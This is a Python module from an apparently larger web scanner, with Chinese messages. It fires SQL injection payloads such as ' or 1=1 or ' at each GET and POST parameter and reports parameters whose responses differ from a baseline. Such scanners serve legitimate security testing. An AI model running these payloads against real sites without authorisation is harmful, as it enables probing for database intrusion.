import asyncio
import re
from typing import List

from .mod import Mod, Page, Report
from .requester import Requester

payloads = [
    pattern.format(quote=quote)
    for pattern in [
        "{quote}||1=1||{quote}",
        "{quote} or 1=1 or {quote}",

        "{quote}||1||{quote}",
        "{quote}&&1&&{quote}6",
        "{quote} and 1 and {quote}6",
        "{quote}+{quote}a",
        "{quote}-{quote}a",
    ]
    for quote in ["'", '"']
]


class SQLFuzzMod(Mod):
    def __init__(self, requester: Requester):
        super().__init__()
        self.requeser = requester
        self.visited = set()

    async def check(self, thing):
        if not isinstance(thing, Page) or (not thing.params and not thing.data):
            return 0
        if thing.url in self.visited:
            return 0
        return 1

    def random_value_by_name(self, name: str):
        if re.search("mail", name, re.IGNORECASE):
            return "a@a.com"
        if re.search("(name|user)", name, re.IGNORECASE):
            return "alicebob"
        if re.search("pass", name, re.IGNORECASE):
            return "114514@#Aasd"
        return "asdf"

    async def test_payloads(self, page, method, param_field, payloads):
        target_params = page.params if method == "GET" else page.data

        return await asyncio.gather(
            *[
                self.requeser.submit_to(
                    page.url,
                    method,
                    {
                        k: payload if k == param_field else self.random_value_by_name(k)
                        for k in target_params
                    },
                )
                for payload in payloads
            ]
        )

    async def crack_by_method(self, page, method):
        reports: List[Report] = []
        target_params = page.params if method == "GET" else page.data
        if target_params is None:
            return []
        example_resp = await self.requeser.submit_to(
            page.url,
            method,
            {k: self.random_value_by_name(k) for k in target_params},
        )
        if example_resp is None:
            self._logger.warning(f"网络错误，无法进行SQL测试")
            return
        self._logger.info(f"开始测试{page}是否含有可以进行SQL的参数")

        for param in target_params:
            valid_payloads = []
            result = await self.test_payloads(page, method, param, payloads)
            for payload, resp in zip(payloads, result):
                if (
                    resp.status_code == example_resp.status_code
                    and resp.text == example_resp.text
                ):
                    continue

                valid_payloads.append(payload)
            if not valid_payloads:
                continue
            reports.append(
                Report(
                    f"在页面 {page.url} 找到一个可能可以进行SQL注入的{method}参数{param}, 所有payload为：{valid_payloads}"
                )
            )
        return reports

    async def crack(self, page):
        assert isinstance(page, Page) and (page.params or page.data)
        self.visited.add(page.url)
        reports_lists = await asyncio.gather(
            *[self.crack_by_method(page, method) for method in ["GET", "POST"]]
        )
        reports: List[Report] = [
            report for reports in reports_lists for report in reports
        ]

        return reports
